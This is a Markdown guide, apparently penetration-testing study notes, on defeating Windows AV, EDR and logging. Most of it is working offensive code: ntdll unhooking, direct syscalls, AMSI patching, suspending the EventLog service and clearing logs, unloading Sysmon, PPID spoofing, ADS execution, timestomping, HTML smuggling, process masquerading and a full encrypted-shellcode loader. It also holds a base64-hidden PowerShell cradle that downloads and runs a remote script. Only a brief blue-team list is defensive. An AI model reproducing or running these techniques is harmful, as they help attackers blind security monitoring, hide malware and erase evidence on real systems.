# Advanced Defense Evasion Techniques

Comprehensive guide for bypassing AV, EDR, and security monitoring - essential for modern penetration testing.

---

## Table of Contents
1. [API Unhooking & EDR Bypass](#1-api-unhooking--edr-bypass)
2. [Direct Syscalls](#2-direct-syscalls)
3. [AMSI Bypass](#3-amsi-bypass)
4. [Event Log Tampering](#4-event-log-tampering)
5. [PPID Spoofing](#5-ppid-spoofing)
6. [File & Data Hiding](#6-file--data-hiding)
7. [Process Masquerading](#7-process-masquerading)
8. [Sysmon Evasion](#8-sysmon-evasion)
9. [Memory Protection](#9-memory-protection)
10. [Obfuscation Techniques](#10-obfuscation-techniques)

---

## 1. API Unhooking & EDR Bypass

### 1.1 Understanding API Hooking

**What EDRs Hook:**
```
User Mode:
Application → kernel32.dll → ntdll.dll → System Call → Kernel
             ↑ EDR Hook 1    ↑ EDR Hook 2
```

**EDR Hooks:**
- **Userland Hooks**: Patch APIs in kernel32.dll, ntdll.dll
- **Kernel Hooks**: SSDT, IDT, IRP hooking (requires driver)

**Detection:**
```cpp
// Check if function is hooked
BYTE *func = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");

// First bytes should be:
// mov r10, rcx; mov eax, <syscall number>; syscall; ret
// If they start with JMP/CALL → function is hooked!

if (func[0] == 0xE9 || func[0] == 0xFF) {
    printf("Function is hooked!\n");
}
```

---

### 1.2 Full DLL Unhooking

**Method 1: Reload Clean ntdll.dll**

```cpp
#include <windows.h>

void UnhookNtdll() {
    // 1. Get handle to hooked ntdll
    HMODULE hookedNtdll = GetModuleHandle("ntdll.dll");

    // 2. Get address of .text section (where functions are)
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hookedNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hookedNtdll + dosHeader->e_lfanew);

    // 3. Find .text section
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((BYTE*)IMAGE_FIRST_SECTION(ntHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));

        if (strcmp((char*)section->Name, ".text") == 0) {
            // 4. Open clean copy from disk
            HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
            LPVOID cleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

            // 5. Calculate clean .text section address
            PIMAGE_DOS_HEADER cleanDosHeader = (PIMAGE_DOS_HEADER)cleanNtdll;
            PIMAGE_NT_HEADERS cleanNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)cleanNtdll + cleanDosHeader->e_lfanew);

            // 6. Copy clean .text over hooked .text
            DWORD oldProtect;
            VirtualProtect((LPVOID)((BYTE*)hookedNtdll + section->VirtualAddress), section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy((LPVOID)((BYTE*)hookedNtdll + section->VirtualAddress), (LPVOID)((BYTE*)cleanNtdll + section->VirtualAddress), section->Misc.VirtualSize);
            VirtualProtect((LPVOID)((BYTE*)hookedNtdll + section->VirtualAddress), section->Misc.VirtualSize, oldProtect, &oldProtect);

            // 7. Cleanup
            CloseHandle(hFile);
            CloseHandle(hMapping);
            UnmapViewOfFile(cleanNtdll);
            break;
        }
    }
}
```

**Method 2: Manual Mapping from KnownDlls**

```cpp
// Load clean ntdll from \KnownDlls\ntdll.dll (in memory, never touched by EDR)
HANDLE hSection = OpenFileMapping(FILE_MAP_READ, FALSE, "\\KnownDlls\\ntdll.dll");
LPVOID cleanNtdll = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);

// Copy clean syscall stubs
// ... (similar to above)
```

---

### 1.3 Detecting Hooks

**PowerShell Detection:**
```powershell
# Check for hooks in ntdll.dll
$ntdll = [System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object {$_.ModuleName -eq "ntdll.dll"}
$ntdllBase = $ntdll.BaseAddress

# Read NtAllocateVirtualMemory
$bytes = [System.Runtime.InteropServices.Marshal]::ReadByte($ntdllBase, 0)

# First byte should be 0x4C (mov r10, rcx)
# If it's 0xE9 (jmp) → hooked!
```

---

## 2. Direct Syscalls

### 2.1 Why Direct Syscalls?

**Problem:**
```
Application → kernel32!VirtualAlloc → ntdll!NtAllocateVirtualMemory → Syscall
              ↑ EDR Hook                ↑ EDR Hook
```

**Solution:**
```
Application → Direct Syscall (bypass all hooks!)
```

---

### 2.2 Manual Syscall Implementation

**Step 1: Find Syscall Number**

```cpp
// NtAllocateVirtualMemory syscall number (varies by Windows version)
// Windows 10: 0x18
// Windows 11: 0x18
// Get dynamically!

DWORD GetSyscallNumber(LPCSTR funcName) {
    HMODULE ntdll = GetModuleHandle("ntdll.dll");
    BYTE *func = (BYTE*)GetProcAddress(ntdll, funcName);

    // Parse: mov r10, rcx; mov eax, <syscall>; syscall; ret
    // Syscall number is at offset +4 (DWORD)
    return *(DWORD*)(func + 4);
}
```

**Step 2: Call Syscall Directly**

```nasm
; Assembly stub for NtAllocateVirtualMemory
NtAllocateVirtualMemory_Syscall:
    mov r10, rcx              ; Windows x64 calling convention
    mov eax, 0x18             ; Syscall number
    syscall                   ; Direct kernel call
    ret
```

**Step 3: Use from C++**

```cpp
extern "C" NTSTATUS NtAllocateVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Usage:
PVOID baseAddr = NULL;
SIZE_T size = 0x1000;
NtAllocateVirtualMemory_Syscall(GetCurrentProcess(), &baseAddr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

---

### 2.3 Syscall Tools

**SysWhispers2:**
```bash
# Generate syscall stubs
python3 syswhispers.py --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls

# Produces:
# - syscalls.h
# - syscalls.c
# - syscalls.asm

# Include in your project
#include "syscalls.h"
NtAllocateVirtualMemory(...);  // Direct syscall!
```

**HellsGate / HalosGate:**
- Dynamically resolve syscall numbers at runtime
- Parse ntdll.dll to extract syscall stubs

---

## 3. AMSI Bypass

### 3.1 AMSI Patching (Memory)

**Method 1: Patch AmsiScanBuffer**

```powershell
# PowerShell AMSI Bypass (classic)
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b
    }
};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {
    if ($e.Name -like "*Context") {
        $f=$e
    }
};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf=@(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

**Method 2: Patch via C++**

```cpp
#include <windows.h>

void PatchAMSI() {
    // Get amsi.dll module
    HMODULE amsi = LoadLibrary("amsi.dll");

    // Get AmsiScanBuffer address
    LPVOID amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");

    // Patch to return AMSI_RESULT_CLEAN (0)
    // Opcode: xor eax, eax; ret
    unsigned char patch[] = {0x31, 0xC0, 0xC3};

    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(amsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(amsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
}
```

---

### 3.2 AMSI Bypass via Obfuscation

**String Splitting:**
```powershell
# Instead of: IEX (New-Object Net.WebClient).DownloadString('http://...')
$w = 'Net.Web' + 'Client'
IEX (New-Object $w).DownloadString('http://...')
```

**Base64 Encoding:**
```powershell
$cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA='))
IEX $cmd
```

---

### 3.3 AMSI Bypass Detection Evasion

**Obfuscate "AMSI" keyword:**
```powershell
# Detected:
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# Bypass:
$a = 'Sys' + 'tem.Man' + 'agement.Aut' + 'omation.Am' + 'siUtils'
$amsi = [Ref].Assembly.GetType($a)
```

---

## 4. Event Log Tampering

### 4.1 Suspend EventLog Service Threads

**Theory:**
- EventLog service writes events via threads
- Suspend all threads → no events logged

```cpp
#include <windows.h>
#include <tlhelp32.h>

void SuspendEventLogThreads() {
    // 1. Find EventLog service process
    DWORD eventlogPID = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe32)) {
        do {
            if (wcscmp(pe32.szExeFile, L"svchost.exe") == 0) {
                // Check if it's EventLog service (requires additional checks)
                // For simplicity, targeting specific PID
                // ... identify correct svchost.exe
            }
        } while (Process32Next(hSnap, &pe32));
    }

    // 2. Enumerate threads
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == eventlogPID) {
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                SuspendThread(hThread);
                CloseHandle(hThread);
            }
        } while (Thread32Next(hSnap, &te32));
    }
}
```

**OSCP Limitation:** Requires SYSTEM privileges

---

### 4.2 Clear Event Logs

**PowerShell:**
```powershell
# Clear all logs
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }

# Clear specific log
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

**Via WMI:**
```powershell
Get-WmiObject Win32_NTEventLogFile | ForEach-Object { $_.ClearEventLog() }
```

---

### 4.3 Disable Sysmon

**Unload Driver:**
```cmd
# Requires SYSTEM
fltmc unload SysmonDrv
```

**Detect Sysmon:**
```powershell
# Check for Sysmon service
Get-Service | Where-Object {$_.Name -like "*sysmon*"}

# Check for Sysmon driver
fltmc | findstr Sysmon
```

---

## 5. PPID Spoofing

### 5.1 Why PPID Spoofing?

**Normal:**
```
cmd.exe (PID 1234)
  └─ powershell.exe (PID 5678, PPID 1234)
```

**Spoofed:**
```
explorer.exe (PID 4000)
  └─ powershell.exe (PID 5678, PPID 4000)  ← Looks legitimate!
```

---

### 5.2 Implementation

```cpp
#include <windows.h>

BOOL CreateProcessWithSpoofedPPID(DWORD spoofedPPID, LPCWSTR application) {
    // 1. Open target parent process
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoofedPPID);

    // 2. Initialize attribute list
    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
    InitializeProcThreadAttributeList(attrList, 1, 0, &attrListSize);

    // 3. Update attribute with spoofed PPID
    UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    // 4. Create process
    STARTUPINFOEX si = {0};
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attrList;
    PROCESS_INFORMATION pi;

    CreateProcess(application, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);

    // 5. Cleanup
    DeleteProcThreadAttributeList(attrList);
    CloseHandle(hParent);

    return TRUE;
}

// Usage:
// Find explorer.exe PID
DWORD explorerPID = 1234;  // Get via GetShellWindow() or enumeration
CreateProcessWithSpoofedPPID(explorerPID, L"C:\\Windows\\System32\\cmd.exe");
```

---

## 6. File & Data Hiding

### 6.1 Alternate Data Streams (ADS)

**Create ADS:**
```cmd
# Hide data in ADS
echo "malicious payload" > benign.txt:hidden.txt

# Execute from ADS
wmic process call create "c:\benign.txt:hidden.exe"

# Or
start \\127.0.0.1\c$\benign.txt:hidden.exe
```

**List ADS:**
```cmd
dir /r
Get-Item -Path .\benign.txt -Stream *
```

---

### 6.2 Timestomping

**Modify File Timestamps:**
```powershell
# Match timestamp to another file
$source = Get-Item "C:\Windows\System32\calc.exe"
$target = Get-Item "C:\payload.exe"

$target.CreationTime = $source.CreationTime
$target.LastWriteTime = $source.LastWriteTime
$target.LastAccessTime = $source.LastAccessTime
```

**Via C++:**
```cpp
HANDLE hFile = CreateFile("payload.exe", FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);

FILETIME ft;
// Set to arbitrary date (e.g., 2020-01-01)
SYSTEMTIME st = {2020, 1, 0, 1, 0, 0, 0, 0};
SystemTimeToFileTime(&st, &ft);

SetFileTime(hFile, &ft, &ft, &ft);
CloseHandle(hFile);
```

---

### 6.3 Hidden Files

**PowerShell:**
```powershell
# Set hidden attribute
$file = Get-Item "payload.exe"
$file.Attributes = 'Hidden,System'

# View hidden files
Get-ChildItem -Hidden -Force
```

---

### 6.4 File Smuggling (HTML/JS)

**HTML Smuggling:**
```html
<html>
<body>
<script>
var payload = "TVqQAAMAAAAEAAAA...";  // Base64 payload
var blob = new Blob([atob(payload)], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'legitimate.exe';
a.click();
</script>
</body>
</html>
```

**Bypasses:** Email filters, web proxies (no direct file transfer)

---

## 7. Process Masquerading

### 7.1 Modify Process Name (_PEB)

**Theory:**
- Process Environment Block (PEB) contains process information
- Modify PEB → change visible process name

```cpp
#include <windows.h>
#include <winternl.h>

void MasqueradeProcess(LPCWSTR fakeName) {
    // Get PEB
    PPEB peb = (PPEB)__readgsqword(0x60);  // x64: GS:[0x60]

    // Get ProcessParameters
    PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;

    // Modify ImagePathName and CommandLine
    UNICODE_STRING newName;
    RtlInitUnicodeString(&newName, fakeName);

    params->ImagePathName = newName;
    params->CommandLine = newName;
}

// Usage:
MasqueradeProcess(L"C:\\Windows\\System32\\svchost.exe");
```

**Detection:** Process Hacker, Volatility can detect mismatch

---

## 8. Sysmon Evasion

### 8.1 Detect Sysmon

```powershell
# Check service
Get-Service Sysmon*

# Check driver
fltmc | findstr Sysmon

# Check registry
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv
```

---

### 8.2 Evade Specific Event IDs

**Event ID 1 (Process Creation):**
- Use WMI or scheduled tasks (less logged)
- PPID spoofing

**Event ID 3 (Network Connection):**
- Use named pipes or RPC instead of direct TCP

**Event ID 7 (DLL Load):**
- Use reflective DLL injection

**Event ID 8 (CreateRemoteThread):**
- Use APC injection or process hollowing

**Event ID 10 (ProcessAccess):**
- Use direct syscalls (no OpenProcess)

---

## 9. Memory Protection

### 9.1 Avoid RWX Memory

**Problem:**
```cpp
// Highly suspicious!
VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

**Solution:**
```cpp
// Allocate as RW
LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// Write shellcode
memcpy(mem, shellcode, size);

// Change to RX before execution
DWORD oldProtect;
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect);

// Execute
((void(*)())mem)();
```

---

### 9.2 Shellcode Encryption

**Runtime Decryption:**
```cpp
// XOR encrypt shellcode
unsigned char encryptedShellcode[] = {...};
unsigned char key = 0xAA;

for (int i = 0; i < sizeof(encryptedShellcode); i++) {
    encryptedShellcode[i] ^= key;
}

// Now execute decrypted shellcode
```

---

## 10. Obfuscation Techniques

### 10.1 String Obfuscation

**Stack Strings:**
```cpp
// Instead of: char str[] = "kernel32.dll";
char str[13];
str[0] = 'k'; str[1] = 'e'; str[2] = 'r'; str[3] = 'n';
str[4] = 'e'; str[5] = 'l'; str[6] = '3'; str[7] = '2';
str[8] = '.'; str[9] = 'd'; str[10] = 'l'; str[11] = 'l';
str[12] = '\0';
```

---

### 10.2 API Hashing

**Instead of:**
```cpp
GetProcAddress(hKernel32, "VirtualAlloc");
```

**Use:**
```cpp
FARPROC GetFunctionByHash(HMODULE hModule, DWORD hash) {
    // Iterate exports, hash each name, compare
    // ...
}

FARPROC pVirtualAlloc = GetFunctionByHash(hKernel32, 0x91AFCA54);  // Hash of "VirtualAlloc"
```

---

## 11. OSCP Practical Examples

### Example 1: Complete AV Evasion Chain

```cpp
// 1. Unhook ntdll
UnhookNtdll();

// 2. Patch AMSI
PatchAMSI();

// 3. Allocate memory (RW)
LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// 4. Decrypt shellcode
for (int i = 0; i < sizeof(shellcode); i++) {
    shellcode[i] ^= 0xAA;
}

// 5. Write shellcode
memcpy(mem, shellcode, sizeof(shellcode));

// 6. Change to RX
DWORD old;
VirtualProtect(mem, sizeof(shellcode), PAGE_EXECUTE_READ, &old);

// 7. Execute via callback
EnumWindows((WNDENUMPROC)mem, 0);
```

---

## 12. Defense Recommendations

**For Blue Team:**
1. Monitor for ntdll.dll modifications
2. Alert on direct syscalls (check for syscall instruction in suspicious processes)
3. Baseline AMSI modifications
4. Monitor PEB modifications
5. Track parent-child process relationships (detect PPID spoofing)

**For Red Team:**
- Combine multiple evasion techniques
- Test against target AV/EDR in lab first
- Use obfuscation tools (ConfuserEx, Obfuscator-LLVM)
- Keep payloads small and targeted

---

## 13. Tools Summary

| Tool | Purpose |
|------|---------|
| **SysWhispers2** | Generate direct syscall stubs |
| **Invoke-Obfuscation** | PowerShell obfuscation |
| **Donut** | Position-independent shellcode |
| **pe_to_shellcode** | Convert PE to shellcode |
| **AMSITrigger** | Find AMSI signatures |
| **DefenderCheck** | Find Defender signatures |

---

## 14. Quick Reference

### Evasion Priority (OSCP)
1. ✅ AMSI Bypass (PowerShell payloads)
2. ✅ Memory protection (RW → RX)
3. ✅ String obfuscation
4. ⚠️ API Unhooking (advanced scenarios)
5. ⚠️ Direct Syscalls (custom tools)

### Detection Difficulty (Low to High)
1. Event Log Clearing (easily detected)
2. AMSI Patching (signature-based detection)
3. RWX Memory (memory scanning)
4. API Unhooking (behavioral detection)
5. Direct Syscalls (very difficult to detect)

---

## References
- Red Team Notes: https://www.ired.team/offensive-security/defense-evasion
- MITRE ATT&CK: T1562, T1036, T1070
- Sektor7 Malware Development
- MalDev Academy

---

**OSCP Exam Note:** Have AMSI bypass and basic obfuscation ready. Focus on avoiding common AV signatures rather than advanced EDR bypass (EDR less common in OSCP).
